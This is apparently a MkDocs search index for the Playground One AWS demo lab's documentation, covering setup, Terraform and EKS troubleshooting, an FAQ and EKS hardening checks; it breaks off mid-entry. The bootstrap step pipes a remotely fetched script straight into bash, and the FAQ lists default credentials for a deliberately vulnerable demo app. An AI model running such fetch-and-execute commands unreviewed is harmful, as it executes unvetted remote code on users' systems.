{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Playground One","text":"<p>Ultra fast and slim playground in the clouds designed for educational and demoing purposes.</p> <p>Under construction!</p> <p>Hello dear Playground One fan. Nice that you found the documentation. This is currently under construction! The contents are therefore to be enjoyed with caution and can still change at any time.</p>"},{"location":"#latest-news","title":"Latest News","text":"<p>!!! Playground integrated with Vision One !!!</p> <p>In a nutshell:</p> <ul> <li>Bootstrapping directly from the clouds. It will attempt to upgrade already installed tools to the latest available version.  </li> </ul> <pre><code>curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <ul> <li>Management of the environment with the help of an easy to use command line interface <code>pgo</code>.</li> <li>Based on Terraform &gt;1.5</li> </ul>"},{"location":"#change-log","title":"Change Log","text":"<p>11/14/2023</p> <ul> <li>Deep Security integrated for use in migration scenarios.</li> </ul> <p>10/27/2023</p> <ul> <li>EKS Fargate &amp; EKS Calico on EC2 operational.</li> </ul> <p>10/10/2023</p> <ul> <li>Playground One goes public.</li> </ul> <p>08/07/2023</p> <ul> <li>Initial release.</li> </ul>"},{"location":"#requirements","title":"Requirements","text":"<p>The Playground One is designed to work with AWS and is tested these operating systems:</p> <ul> <li>Ubuntu Bionic and newer</li> <li>Cloud9 with Ubuntu</li> </ul>"},{"location":"#system-health","title":"System Health","text":"Component Operational Known Issues Vision One Cloud Security EC2 Linux Yes None V1 Server &amp; Workload Protection EC2 Windows Yes None V1 Server &amp; Workload Protection EKS EC2 Yes None V1CS Runtime ScanningV1CS Runtime SecurityOAT&amp;WB Generation EKS Fargate Yes None V1CS Runtime ScanningV1CS Runtime SecurityOAT&amp;WB Generation EKS Calico Yes EKS EC2 only EKS Prometheus Yes EKS EC2 only EKS Trivy Yes EKS EC2 only ECS EC2 Yes See 1) V1CS Runtime ScanningV1CS Runtime Security ECS Fargate Yes See 2) V1CS Runtime ScanningV1CS Runtime Security TMAS Yes None Artifact Scanning for Vulnerabilities and Malware Deep Security Yes None tbd <p>1) Deleting the cluster requires the deactivation runtime scanning and runtime security before destroying the cluster. If destroy process <code>module.ecs-ec2[0].module.ecs_service.aws_ecs_service.this[0]: Still destroying...</code> hangs for a couple of minutes manually terminate the autoscaling group <code>pgo4-ecs-ec2-asg-spot-...</code> in AWS.</p> <p>2) Activating Runtime Security requires some manual steps, see documentation. Deleting the cluster requires the deactivation of runtime scanning and runtime security before destroying the cluster. Newly created task definitions must be removed manually.</p>"},{"location":"#cli-commands-of-the-playground","title":"CLI Commands of the Playground","text":"<p>Besides the obvious cli tools like <code>kubectl</code>, etc. the Playground offers you additional commands shown in the table below (and more):</p> Command Function pgo The command line interface for Playground One stern Tail logs from multiple pods simultaneously syft See github.com/anchore/syft grype See github.com/anchore/grype k9s See k9scli.io"},{"location":"bloopers/","title":"Bloopers during development","text":""},{"location":"bloopers/#terraform","title":"Terraform","text":""},{"location":"bloopers/#delete-all-resources-except-one","title":"Delete all resources except one","text":"<p>There is no --except feature in terraform destroy command currently. If you really want to do that, and you know what you are doing, here is the workaround.</p> <pre><code># list all resources\nterraform state list\n\n# remove that resource you don't want to destroy\n# you can add more to be excluded if required\nterraform state rm &lt;resource_to_be_deleted&gt; # destroy the whole stack except above excluded resource(s)\nterraform destroy </code></pre> <p>So why do these commands work for your idea?</p> <p>The state (*.tfstate) is used by Terraform to map real world resources to your configuration, keep track of metadata.</p> <p>terraform state rm cleans a record (resource) from the state file (*.tfstate) only. It doesn't destroy the real resource.</p> <p>Since you don't run terraform apply or terraform refresh, after terraform state rm, terraform doesn't know the excluded resource was created at all.</p> <p>When you run terraform destroy, it has no detail about that excluded resource\u2019s state and will not destroy it. It will destroy the rest.</p> <p>By the way, later you still have chance to import the resource back with terraform import command if you want.</p> <pre><code>terraform import module.vpc.aws_vpc.vpc vpc-0933149e01f1136aa\n</code></pre>"},{"location":"bloopers/#ecs-cluster-with-capacity-providers-cannot-be-destroyed","title":"ECS cluster with capacity providers cannot be destroyed","text":"<p>The problem is that the capacity_provider property on the aws_ecs_cluster introduces a new dependency: aws_ecs_cluster depends on aws_ecs_capacity_provider depends on aws_autoscaling_group.</p> <p>This causes terraform to destroy the ECS cluster before the autoscaling group, which is the wrong way around: the autoscaling group must be destroyed first because the cluster must contain zero instances before it can be destroyed.</p> <p>This leads to Terraform error out with the cluster partly alive and the capacity providers fully alive.</p> <p>References:</p> <ul> <li>https://github.com/hashicorp/terraform-provider-aws/issues/4852</li> <li>https://github.com/hashicorp/terraform-provider-aws/issues/11409</li> <li>https://github.com/hashicorp/terraform-provider-aws/pull/22672</li> </ul> <p>I haven't found a proper workaround, yet...</p>"},{"location":"bloopers/#eks","title":"EKS","text":""},{"location":"bloopers/#unable-to-delete-ingress","title":"Unable to delete ingress","text":"<pre><code>kubectl delete ValidatingWebhookConfiguration aws-load-balancer-webhook\nkubectl patch ingress $ingressname -n $namespace -p '{\"metadata\":{\"finalizers\":[]}}' --type=merge\n</code></pre>"},{"location":"bloopers/#unable-to-delete-namespace","title":"Unable to delete namespace","text":"<p>To delete a namespace, Kubernetes must first delete all the resources in the namespace. Then, it must check registered API services for the status. A namespace gets stuck in Terminating status for the following reasons:</p> <ul> <li>The namespace contains resources that Kubernetes can't delete.</li> <li> <p>An API service has a False status.</p> </li> <li> <p>Save a JSON file like in the following example:</p> </li> </ul> <pre><code>kubectl get namespace $namespace -o json &gt; tempfile.json\n</code></pre> <ol> <li>Remove the finalizers array block from the spec section of the JSON file:</li> </ol> <pre><code>\"spec\": {\n\"finalizers\": [\n\"kubernetes\"\n]\n}\n</code></pre> <p>After you remove the finalizers array block, the spec section of the JSON file looks like this:</p> <pre><code>\"spec\" : {\n}\n</code></pre> <ol> <li>To apply the changes, run the following command:</li> </ol> <pre><code>kubectl replace --raw \"/api/v1/namespaces/$namespace/finalize\" -f ./tempfile.json\n</code></pre> <ol> <li>Verify that the terminating namespace is removed:</li> </ol> <pre><code>kubectl get namespaces\n</code></pre> <p>Repeat these steps for any remaining namespaces that are stuck in the Terminating status.</p>"},{"location":"bloopers/#eksworkernode-is-not-joining-node-group","title":"EKSWorkerNode is not joining Node Group","text":"<p>This does help to identify the problem:</p> <ul> <li>https://repost.aws/knowledge-center/resolve-eks-node-failures</li> <li>https://docs.aws.amazon.com/systems-manager-automation-runbooks/latest/userguide/automation-awssupport-troubleshooteksworkernode.html</li> <li>https://console.aws.amazon.com/systems-manager/automation/execute/AWSSupport-TroubleshootEKSWorkerNode</li> </ul>"},{"location":"bloopers/#eks-service-behind-alb-shows-only-html","title":"EKS Service behind ALB shows only HTML","text":"<pre><code>resource \"kubernetes_ingress_v1\" \"openssl3_ingress\" {\nwait_for_load_balancer = true\nmetadata {\nannotations = {\n\"alb.ingress.kubernetes.io/scheme\"        = \"internet-facing\"\n\"alb.ingress.kubernetes.io/target-type\"   = \"ip\"\n\"kubernetes.io/ingress.class\"             = \"alb\"\n\"alb.ingress.kubernetes.io/inbound-cidrs\" = var.access_ip\n}\nlabels = {\napp = \"web-app\"\n}\nname      = \"web-app-ingress\"\nnamespace = var.namespace\n}\nspec {\nrule {\nhttp {\npath {\nbackend {\nservice {\nname = \"web-app-service\"\nport {\nnumber = 80\n}\n}\n}\npath = \"/*\"\n}\n}\n}\n}\n}\n</code></pre> <p>The <code>*</code> in <code>path</code> is important :-)</p>"},{"location":"bloopers/#route53","title":"Route53","text":"<p>If a hosted zone is destroyed and re-provisioned, new name server records are associated with the new hosted zone. However, the domain name might still have the previous name server records associated with it.</p> <p>If AWS Route 53 is used as the domain name registrar, head to Route 53 &gt; Registered domains &gt; ${your-domain-name} &gt; Add or edit name servers and add the newly associated name server records from the hosted zone to the registered domain.</p>"},{"location":"bloopers/#xdr-for-containers","title":"XDR for Containers","text":"<p>Initially, I thought I just need to leave the VPC alone when changing/destroying part of the network configuration. This was a failure...</p>"},{"location":"bloopers/#misc-commands-which-helped-at-some-point","title":"Misc commands which helped at some point","text":"<pre><code>aws kms delete-alias --alias-name alias/eks/playground-one-eks\n</code></pre>"},{"location":"bloopers/#eks-ec2-autoscaler","title":"EKS EC2 Autoscaler","text":"<p>In some cases creating the EKS cluster with EC2 instances failes just before finishing with the following error:</p> <pre><code>\u2577\n\u2502 Warning: Helm release \"cluster-autoscaler\" was created but has a failed status. Use the `helm` command to investigate the error, correct it, then run Terraform again.\n\u2502 \u2502   with module.eks.helm_release.cluster_autoscaler[0],\n\u2502   on eks-ec2/autoscaler.tf line 25, in resource \"helm_release\" \"cluster_autoscaler\":\n\u2502   25: resource \"helm_release\" \"cluster_autoscaler\" {\n\u2502 \u2575\n...\n\u2577\n\u2502 Error: 1 error occurred:\n\u2502       * Internal error occurred: failed calling webhook \"mservice.elbv2.k8s.aws\": failed to call webhook: Post \"https://aws-load-balancer-webhook-service.kube-system.svc:443/mutate-v1-service?timeout=10s\": no endpoints available for service \"aws-load-balancer-webhook-service\"\n\u2502 \u2502 \u2502 \u2502   with module.eks.helm_release.cluster_autoscaler[0],\n\u2502   on eks-ec2/autoscaler.tf line 25, in resource \"helm_release\" \"cluster_autoscaler\":\n\u2502   25: resource \"helm_release\" \"cluster_autoscaler\" {\n\u2502 \u2575\n</code></pre> <p>This looks like a timing issue for me which I need to investigate further. If you run into this problem just rerun</p> <pre><code>pgo --apply eks-ec2\n</code></pre> <p>This should complete the cluster creation within seconds then.</p>"},{"location":"faq/","title":"Frequently asked Questions","text":""},{"location":"faq/#how-to-update-the-playgound-one","title":"How to update the Playgound One?","text":"<p>The Playground is under contiuous development. Even if I try to not implement breaking changes please follow the steps below before updating it to the latest version:</p> <pre><code># Destroy your deployments\npgo --destroy all\n\n# Destroy your network\npgo --destroy nw\n\n# Do the update\ncd ${ONEPATH}\ngit pull\n\n# Run config\npgo --config\n</code></pre> <p>If everything went well you should be able to recreate your environment. If you run into trouble please open an issue.</p>"},{"location":"faq/#im-running-the-playground-on-a-cloud9-and-want-to-restrict-access-to-my-home-ip","title":"I'm running the Playground on a Cloud9 and want to restrict access to my home IP","text":"<p>If you work on a Cloud9 you need to take care on two public IP addresses instead of one when having the playground locally. These are the public IP of your own network (where your own computer is located) and the public IP of your Cloud9.</p> <p>Your own IP is required since you likely want to access the applications provided by the Playground One running on EKS, ECS and connect to the EC2 instances.</p> <p>The public IP of the Cloud9 is required to allow your Cloud9 access the EC2 instances while provisioning.</p> <p>For this to work you need to define two <code>Access IPs/CIDRs</code> in the configuration workflow with <code>pgo --configure</code>.</p> <p>Example:</p> <p>Public IP address of your</p> <ul> <li>Cloud 9 instance: <code>3.123.18.11</code> (get it from the EC2 console), and</li> <li>Client at home: <code>87.170.6.193</code></li> </ul> <pre><code> __                 __   __   __             __      __        ___ |__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  |    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ ...\nPlease set/update your Playground One configuration\nAccess IPs/CIDRs []: 3.123.18.11, 87.170.6.193\n...\n</code></pre> <p>The above will automatically be converted into the correct CIDRs <code>3.123.18.11/32, 87.170.6.193/32</code></p> <p>To simplify this process you can easily let the config tool determine the Cloud9 public IP address by entering the keyword <code>pub</code>.</p> <pre><code>...\nPlease set/update your Playground One configuration\nAccess IPs/CIDRs []: pub, 87.170.6.193\n...\n</code></pre> <p>Then run</p> <pre><code>pgo --init nw\npgo --apply nw\n</code></pre>"},{"location":"faq/#my-ip-address-has-changed-and-i-cannot-access-my-environment-anymore","title":"My IP address has changed and I cannot access my environment anymore","text":"<p>If you need to change the access IP later on, maybe your provider assigned you a new one, follow these steps:</p> <ol> <li>Run <code>pgo --updateip</code> and set the new IP address as described in Getting Started Configuration</li> <li> <p>Terraform tells you which actions will be performed when approving them. Validate that there will be only one in-place update on the resource <code>module.ec2.aws_security_group.sg[\"public\"]</code>.</p> <pre><code>Terraform used the selected providers to generate the following execution plan. Resource actions are indicated with the following symbols:\n  ~ update in-place\n\nTerraform will perform the following actions:\n\n  # module.ec2.aws_security_group.sg[\"public\"] will be updated in-place\n  ~ resource \"aws_security_group\" \"sg\" {\n        id                     = \"sg-01e76a72ffd468baa\"\n      ~ ingress                = [\n...\n</code></pre> </li> <li> <p>Approve the actions by entering <code>yes</code>, otherwise press <code>^c</code>.</p> </li> </ol> <p>This should be completed within a minute.</p> <p>If the above didn't work for you and you still need to update the IP(s) you need to run</p> <pre><code>pgo --destroy all\npgo --init all\npgo --apply nw\n</code></pre> <p>Then reapply your eks, ecs, ec2 or scenarios by <code>pgo --apply &lt;configuration&gt;</code>.</p>"},{"location":"faq/#i-restarted-my-cloud9-instance-and-i-cannot-access-my-environment-anymore","title":"I restarted my Cloud9 instance and I cannot access my environment anymore","text":"<p>See above.</p>"},{"location":"faq/#i-cannot-destroy-the-ecs-clusters","title":"I cannot destroy the ECS cluster(s)","text":"<p>If you have enabled <code>Runtime Scanning</code> and/or <code>Runtime Security</code> in your Vision One console for your ECS clusters disable them and press <code>[Save]</code>. The clusters should then be successfully destroyed.</p> <p>Background: Vision One injects addisional tasks to the ECS clusters which are not known by the playground. Even if you delete the task in the AWS console they are injected again by Vision One. This causes a remaining dependency on the AWS side which prevents the destruction of ECS.</p> <p>Special case for ECS EC2</p> <p>There's a known bug in Terraform. The problem is that this new capacity_provider property on the aws_ecs_cluster introduces a new dependency: aws_ecs_cluster depends on aws_ecs_capacity_provider depends on aws_autoscaling_group.</p> <p>This causes terraform to destroy the ECS cluster before the autoscaling group, which is the wrong way around: the autoscaling group must be destroyed first because the cluster must contain zero instances before it can be destroyed.</p> <p>This leads to Terraform error out with the cluster partly alive and the capacity providers fully alive.</p> <p>The <code>pgo</code> CLI solves this problem by running <code>aws</code> CLI commands to delete the capacity providers before doing <code>terraform destroy</code>. Not nice but works.</p>"},{"location":"faq/#i-dont-find-the-todolist-app-of-java-goof","title":"I don't find the <code>todolist</code>-app of Java-Goof","text":"<p>To access the <code>todolist</code> application append <code>/todolist</code> to the loadbalancer DNS name in your browser.</p> <p>For authentication use:</p> <ul> <li>Username: <code>foo@bar.org</code></li> <li>Password: <code>foobar</code></li> </ul>"},{"location":"security/","title":"Playground One Security","text":""},{"location":"security/#network","title":"Network","text":""},{"location":"security/#eks","title":"EKS","text":""},{"location":"security/#54-cluster-networking","title":"5.4. Cluster Networking","text":"<p>Restrict Access to the Control Plane Endpoint</p> <p>Authorized networks are a way of specifying a restricted range of IP addresses that are permitted to access your cluster's control plane. Kubernetes Engine uses both Transport Layer Security (TLS) and authentication to provide secure access to your cluster's control plane from the public internet. This provides you the flexibility to administer your cluster from anywhere; however, you might want to further restrict access to a set of IP addresses that you control. You can set this restriction by specifying an authorized network.</p> <p>Restricting access to an authorized network can provide additional security benefits for your container cluster, including:</p> <ul> <li>Better protection from outsider attacks: Authorized networks provide an additional layer of security by limiting external access to a specific set of addresses you designate, such as those that originate from your premises. This helps protect access to your cluster in the case of a vulnerability in the cluster's authentication or authorization mechanism.</li> <li>Better protection from insider attacks: Authorized networks help protect your cluster from accidental leaks of master certificates from your company's premises. Leaked certificates used from outside Cloud Services and outside the authorized IP ranges (for example, from addresses outside your company) are still denied access.</li> </ul> <p>By enabling private endpoint access to the Kubernetes API server, all communication between your nodes and the API server stays within your VPC. You can also limit the IP addresses that can access your API server from the internet, or completely disable internet access to the API server.</p> <p>With this in mind, you can update your cluster accordingly using the AWS CLI to ensure that Private Endpoint Access is enabled.</p> <p>If you choose to also enable Public Endpoint Access then you should also configure a list of allowable CIDR blocks, resulting in restricted access from the internet. If you specify no CIDR blocks, then the public API server endpoint is able to receive and process requests from all IP addresses by defaulting to ['0.0.0.0/0'].</p> <p>For example, the following command would enable private access to the Kubernetes API as well as limited public access over the internet from a single IP address (noting the /32 CIDR suffix):</p> <pre><code>aws eks update-cluster-config --region ${aws_region} --name ${cluster_name} --resources-vpc-config endpointPrivateAccess=true, endpointPrivateAccess=true,publicAccessCidrs=\"203.0.113.5/32\"\n</code></pre> <p>Audit - Playground One:</p> <pre><code>cd ${ONEPATH}/awsone/4-cluster-eks-ec2\ncluster_name=$(terraform output -raw cluster_name)\necho Cluster private access enpoint enabled:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.endpointPrivateAccess\"\necho Cluster public access enpoint enabled:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.endpointPublicAccess\"\necho Cluster public access CIDRs:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.publicAccessCidrs\"\n</code></pre> <pre><code># Example\nCluster private access enpoint enabled:\ntrue\nCluster public access enpoint enabled:\ntrue\nCluster public access CIDRs:\n[\n\"84.190.104.66/32\"\n]\n</code></pre> <p>References: https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> <p>CIS Controls:</p> <ul> <li>4.4 Implement and Manage a Firewall on Servers Implement and manage a firewall on servers, where supported. Example implementations include a virtual firewall, operating system firewall, or a third-party firewall agent.</li> <li>9.3 Maintain and Enforce Network-Based URL Filters Enforce and update network-based URL filters to limit an enterprise asset from connecting to potentially malicious or unapproved websites. Example implementations include category-based filtering, reputation-based filtering, or through the use of block lists. Enforce filters for all enterprise assets.</li> <li>7.4 Maintain and Enforce Network-Based URL Filters Enforce network-based URL filters that limit a system's ability to connect to websites not approved by the organization. This filtering shall be enforced for each of the organization's systems, whether they are physically at an organization's facilities or not.</li> </ul> <p>Ensure clusters are created with Private Endpoint Enabled and Public Access Disabled</p> <p>In a private cluster, the master node has two endpoints, a private and public endpoint. The private endpoint is the internal IP address of the master, behind an internal load balancer in the master's VPC network. Nodes communicate with the master using the private endpoint. The public endpoint enables the Kubernetes API to be accessed from outside the master's VPC network.</p> <p>Although Kubernetes API requires an authorized token to perform sensitive actions, a vulnerability could potentially expose the Kubernetes publically with unrestricted access. Additionally, an attacker may be able to identify the current cluster and Kubernetes API version and determine whether it is vulnerable to an attack. Unless required, disabling public endpoint will help prevent such threats, and require the attacker to be on the master's VPC network to perform any attack on the Kubernetes API. Impact:</p> <p>Configure the EKS cluster endpoint to be private.</p> <ol> <li>LeavetheclusterendpointpublicandspecifywhichCIDRblockscan communicate with the cluster endpoint. The blocks are effectively a whitelisted set of public IP addresses that are allowed to access the cluster endpoint.</li> <li>ConfigurepublicaccesswithasetofwhitelistedCIDRblocksandsetprivate endpoint access to enabled. This will allow public access from a specific range of public IPs while forcing all network traffic between the kubelets (workers) and the Kubernetes API through the cross-account ENIs that get provisioned into the cluster VPC when the control plane is provisioned.</li> </ol> <p>Audit - Playground One (see above)</p> <p>References: https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> <p>CIS Controls:</p> <ul> <li>4.4 Implement and Manage a Firewall on Servers Implement and manage a firewall on servers, where supported. Example implementations include a virtual firewall, operating system firewall, or a third-party firewall agent.</li> <li>12 Boundary Defense</li> </ul> <p>Ensure clusters are created with Private Nodes</p> <p>Disabling public IP addresses on cluster nodes restricts access to only internal networks, forcing attackers to obtain local network access before attempting to compromise the underlying Kubernetes hosts.</p> <p>To enable Private Nodes, the cluster has to also be configured with a private master IP range and IP Aliasing enabled.</p> <p>Private Nodes do not have outbound access to the public internet. If you want to provide outbound Internet access for your private nodes, you can use Cloud NAT or you can manage your own NAT gateway.</p> <p>Audit - Playground One (see above)</p> <p>References: https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html</p> <p>CIS Controls:</p> <ul> <li>4.4 Implement and Manage a Firewall on Servers Implement and manage a firewall on servers, where supported. Example implementations include a virtual firewall, operating system firewall, or a third-party firewall agent.</li> <li>12 Boundary Defense</li> </ul> <p>Ensure Network Policy is Enabled and set as appropriate</p> <pre><code>cd ${ONEPATH}/awsone/4-cluster-eks-ec2\ncluster_name=$(terraform output -raw cluster_name)\necho Cluster security group id:\naws eks describe-cluster --name ${cluster_name} --query \"cluster.resourcesVpcConfig.clusterSecurityGroupId\"\n</code></pre> <pre><code># Example\nCluster security group id:\n\"sg-0a8c50569b529a3b3\"\n</code></pre> <p>CIS Controls:</p> <ul> <li>12.6 Use of Secure Network Management and Communication Protocols. Use secure network management and communication protocols (e.g., 802.1X, Wi-Fi Protected Access 2 (WPA2) Enterprise or greater).</li> <li>9.2 Ensure Only Approved Ports, Protocols and Services Are Running. Ensure that only network ports, protocols, and services listening on a system with validated business needs, are running on each system.</li> <li>9.4 Apply Host-based Firewalls or Port Filtering Apply host-based firewalls or port filtering tools on end systems, with a default-deny rule that drops all traffic except those services and ports that are explicitly allowed.</li> </ul> <p>Encrypt traffic to HTTPS load balancers with TLS certificates</p> <p>Encrypting traffic between users and your Kubernetes workload is fundamental to protecting data sent over the web.</p> <p>Audit:</p> <p>Your load balancer vendor can provide details on auditing the certificates and policies required to utilize TLS.</p> <p>CIS Controls:</p> <ul> <li>3.10 Encrypt Sensitive Data in Transit. Encrypt sensitive data in transit. Example implementations can include: Transport Layer Security (TLS) and Open Secure Shell (OpenSSH).</li> <li>14.4 Encrypt All Sensitive Information in Transit Encrypt all sensitive information in transit.</li> </ul>"},{"location":"security/#vision-one-container-security","title":"Vision One Container Security","text":"<p>The API key is used for communication with the backend throughout the life of the in-cluster app.</p> <p>The API key is generated when generating the cluster and copied to the <code>overrides.yaml</code>.</p> <p>Determine whether to use existing secrets in the target namespace rather than specifying in overrides.yaml. Useful if you want to manage secrets on your own, e.g., in argocd.</p> <p>When this is enabled, typically you will need these secrets created in your target namespace. (names may vary depending on your settings):</p> <ul> <li>trendmicro-container-security-auth</li> <li>trendmicro-container-security-outbound-proxy-credentials</li> </ul> <p>You can fill overrides.yaml and use helm install --dry-run to generate these secret's template.</p> <p>After deployment, if you update the secret after deployment, you will need to restart pods of container security to make changes take effect.</p> <p><code>useExistingSecrets: false</code></p>"},{"location":"getting-started/configuration/","title":"Getting Started Configuration","text":"<p>Playground One is controlled by the command line interface <code>pgo</code>.</p> <p>Use it to interact with the Playground One by running</p> <pre><code>pgo\n</code></pre> <p>from anywhere in your terminal.</p> <p>Note: If <code>pgo</code> is not found create a new shell to load the environment or run <code>. ~/.bashrc</code>.</p>"},{"location":"getting-started/configuration/#getting-help","title":"Getting Help","text":"<p>Run:</p> <pre><code>pgo --help\n</code></pre> <pre><code> __                 __   __   __             __      __        ___ |__) |     /\\  \\ / / _` |__) /  \\ |  | |\\ | |  \\    /  \\ |\\ | |__  |    |___ /~~\\  |  \\__&gt; |  \\ \\__/ \\__/ | \\| |__/    \\__/ | \\| |___ Usage: pgo -&lt;command&gt; &lt;configuration&gt; ...\n\nThe available commands for execution are listed below.\nThe primary workflow commands are given first, followed by\nless common or more advanced commands.\n\nAvailable configurations: vpc, nw, ec2, eks-ec2, eks-fg, ecs, scenarios-ec2, scenarios-fg\n\nMain commands:\n  -c --config   Set/update Playground One main configuration\n  -i --init     Prepare a configuration for other commands\n  -a --apply    Create or update a configuration\n  -l --list     List applied configurations\n  -d --destroy  Destroy previously-created configuration\n  -o --output   Show output values\n  -s --state    Show the current state\n  -h --help     Show this help\nOther commands:\n  -S --show     Show advanced state\n  -u --updateip Update access IP(s)\n-v --validate Check whether the configuration is valid\n\nAvailable configurations:\n  nw            Network configuration\n  ec2           EC2 configuration\n  eks-ec2       EKS configuration\n  eks-fg        EKS configuration\n  ecs           ECS configurations\n  kind          Kind configuration\n  scenarios-ec2 Scenario configuration\n  scenarios-fg  Scenario configuration\n  dsm           Deep Security configuration\n  all           All configurations\n\nExamples:\n  pgo --apply nw\n  pgo --state all\n</code></pre>"},{"location":"getting-started/configuration/#configure","title":"Configure","text":"<p>After bootstrapping you need to configure Playground One. To simplify the process use the built in configuration tool. An eventually already existing <code>config.yaml</code> will be saved as <code>config.yaml.bak</code>. Run</p> <pre><code>pgo --config\n</code></pre> <p>This process will create or update your personal <code>config.yaml</code>. Eventually existing setting will be shown in square brackets. To accept them just press enter.</p> <p>The configuration tool is devided into sections. The following chapters walk you through the process.</p>"},{"location":"getting-started/configuration/#section-aws","title":"Section: AWS","text":"<p>Note: This section is skipped when you have any configuration applied.</p> <p>Set/update:</p> <ul> <li><code>AWS Account ID</code>: The ID of your AWS subscription (just numbers no <code>-</code>). This is mandatory.</li> <li><code>AWS region name</code>: If you want to use another region as <code>eu-central-1</code>.</li> <li><code>AWS environment name</code>: Your to be built environment name. It MUST NOT be longer than 12 characters.</li> </ul>"},{"location":"getting-started/configuration/#section-playground-one","title":"Section: Playground One","text":"<p>You don't necessarily need to change anything here if you're satisfied with the defaults, but</p> <p>Note: It is highly recommended to change the <code>Access IPs/CIDRs</code> to (a) single IP(s) or at least a small CIDR to prevent anonymous users playing with your environmnent. Remember: we might deploy vulnerable applications.</p> <p>Set/update:</p> <ul> <li><code>Access IPs/CIDRs</code>:</li> <li>If you're running on a local Ubuntu server (not Cloud9), get your public IP and set the value to <code>&lt;YOUR IP&gt;/32</code> or type <code>pub</code> and let the config tool detect your public IP.</li> <li>If you're working on a Cloud9 you need enter two public IP/CIDRs separated by <code>,</code>.<ol> <li>Public IP from your Cloud9 or type <code>pub</code>.</li> <li>Public IP from your local client.  </li> </ol> </li> <li>If you want someone else grant access to your environment just add another IP/CIDR.</li> <li>Examples:<ul> <li><code>pub</code></li> <li><code>pub, 86.120.222.205</code></li> <li><code>3.121.226.247/32, 86.120.222.20/32</code></li> <li><code>0.0.0.0/0</code> Dangerous!</li> </ul> </li> <li><code>EC2 - create Linux EC2</code>: Enable/disable Linux instances in the <code>ec2</code> configuration.</li> <li><code>EC2 - create Windows EC2</code>: Enable/disable Windows instances in the <code>ec2</code> configuration.</li> <li><code>ECS - utilize EC2 nodes</code>: Enable/disable ECS cluster with EC2 nodes.</li> <li><code>ECS - utilize Fargate nodes</code>: Enable/disable ECS cluster with Fargate nodes.</li> </ul> <p>If your IP address has changed see FAQ.</p>"},{"location":"getting-started/configuration/#section-container-security-currently-disabled","title":"Section: Container Security (currently disabled)","text":"<p>Note: Configuration and automated deployment currently disabled due to missing APIs.</p> <p>Set/update:</p> <ul> <li><code>Container Security</code>: Enable or disable the Container Security deployment. If set to <code>false</code> Cloud One configuration will be skipped.</li> <li><code>Container Security policy ID</code>: To get the Policy ID for your Container Security deployment head over to Container Security on Cloud One and navigate to the policy. The Policy ID is the part after the last <code>/</code> in the URL: https://cloudone.trendmicro.com/container/policies/relaxed_playground-2OxPQEiC6Jo4dbDVfebKiZMuredHere: <code>relaxed_playground-2OxPQEiC6Jo4dbDVfebKiZMured</code></li> <li><code>Cloud One region name</code>: Set your Cloud One region here if it is not <code>trend-us-1</code>.</li> <li><code>Cloud One API Key</code>: Your Cloud One API Key with full access. This is mandatory.</li> </ul>"},{"location":"getting-started/configuration/#section-integrations-configuration","title":"Section: Integrations Configuration","text":"<p>Set/update:</p> <ul> <li><code>EKS Calico</code>: Enable/disable the most used Pod network on your EKS cluster. It's currently disabled by default but will come shortly</li> <li><code>EKS Prometheus &amp; Grafana</code>: Enable/disable Prometheus. It is an open-source systems monitoring and alerting toolkit integrated with a preconfigured Grafana.</li> <li><code>EKS Trivy</code>: Enable/disable Trivy vulnerability scanning for comparison.</li> </ul>"},{"location":"getting-started/configuration/#section-deep-security","title":"Section: Deep Security","text":"<p>Set/update:</p> <ul> <li><code>Deep Security</code>: Enable or disable the Deep Security deployment. If set to <code>false</code> Deep Security configuration will be skipped.</li> <li><code>Deep Security License</code>: Your Deep Security license key.</li> <li><code>Deep Security Username</code>: Username of the MasterAdmin.</li> <li><code>Deep Security Password</code>: Password of the MasterAdmin.</li> </ul> <p>Now, continue with the chapter General Life-Cycle.</p>"},{"location":"getting-started/life-cycle/","title":"General Life-Cycle","text":""},{"location":"getting-started/life-cycle/#create-the-environment","title":"Create the Environment","text":"<ol> <li> <p>Initialize with</p> <pre><code>pgo --init all\n</code></pre> <p>This will prepare all available configurations. No changes done in the clouds yet. You only need to init once after cloning the repository.</p> <p>If you have changed Playground Ones main configuration using <code>pgo --config</code> please rerun <code>pgo --init all</code> again to apply eventual changes to the configurations.</p> </li> <li> <p>To create the VPC and Network run</p> <pre><code>pgo --apply nw\n</code></pre> <p>This will create your VPC and network in the configured region (see <code>config.yaml</code>)</p> </li> <li> <p>If you want your EC2 instances to be connected to Vision One Endpoint Security head over to Vision One Endpoint Security Server &amp; Workload Protection and come back afterwards.</p> </li> <li> <p>Create Virtual Instances and/or Kubernetes Clusters with demo workload.</p> <p>EC2 instances:</p> <pre><code>pgo --apply ec2\n</code></pre> <p>EKS EC2 cluster:</p> <pre><code>pgo --apply eks-ec2\n</code></pre> <p>EKS Fargate cluster:</p> <pre><code>pgo --apply eks-fg\n</code></pre> <p>ECS cluster(s):</p> <pre><code>pgo --apply ecs\n</code></pre> </li> </ol> <p>Note: If you're using both EKS cluster variants simultaneously you can easily switch in between the clusters using the command <code>pgo-context</code>.</p> <p></p>"},{"location":"getting-started/life-cycle/#query-outputs-and-state","title":"Query Outputs and State","text":"<p>The most relevant information on your configuration can be queried by running</p> <pre><code>pgo --output &lt;configuration&gt;\n</code></pre> <p>Example: <code>pgo --output ec2</code>:</p> <pre><code>public_instance_id_db1 = \"i-072abd953dedaae5d\"\npublic_instance_id_srv1 = \"i-0f2c91e08fd054510\"\npublic_instance_id_web1 = \"i-048ecedf660236f47\"\npublic_instance_ip_db1 = \"3.76.39.227\"\npublic_instance_ip_srv1 = \"3.75.219.198\"\npublic_instance_ip_web1 = \"18.197.106.33\"\npublic_instance_password_srv1 = &lt;sensitive&gt;\ns3_bucket = \"playground-awsone-cesh306v\"\nssh_instance_db1 = \"ssh -i ../playground-key-pair.pem -o StrictHostKeyChecking=no ubuntu@3.76.39.227\"\nssh_instance_srv1 = 